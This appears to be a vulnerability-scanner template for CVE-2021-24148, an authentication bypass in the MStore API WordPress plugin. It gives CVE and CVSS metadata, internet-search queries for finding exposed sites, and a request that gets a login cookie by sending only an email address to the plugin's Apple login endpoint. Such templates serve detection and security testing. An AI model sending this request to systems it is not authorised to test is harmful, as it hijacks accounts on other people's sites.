id: CVE-2021-24148

info:
  name: Authentication Bypass with Sign In With Apple in MStore API
  author: ProjectDiscoveryAI
  severity: critical
  description: A business logic issue in the MStore API WordPress plugin, versions before 3.2.0, had an authentication bypass with Sign In With Apple allowing unauthenticated users to recover an authentication cookie with only an email address.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Implement proper authentication controls and ensure Sign In With Apple is securely integrated.
  reference:
    - https://wpscan.com/vulnerability/bf5ddc43-974d-41fa-8276-c1a27d3cc882
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24148
    cwe-id: CWE-287
    epss-score: 0.00252
    epss-percentile: 0.65483
    cpe: cpe:2.3:a:inspireui:mstore_api:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: inspireui
    product: mstore_api
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/mstore-api/"
    fofa-query: body=/wp-content/plugins/mstore-api/
    publicwww-query: /wp-content/plugins/mstore-api/
    google-query: inurl:/wp-content/plugins/mstore-api/
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/api/flutter_user/apple_login"

    headers:
      Content-Type: application/json
      Accept: application/json

    body: |
      {
        "email": "email@example.com"
      }
    matchers:
      - type: word
        words:
          - "Set-Cookie: "
        part: header
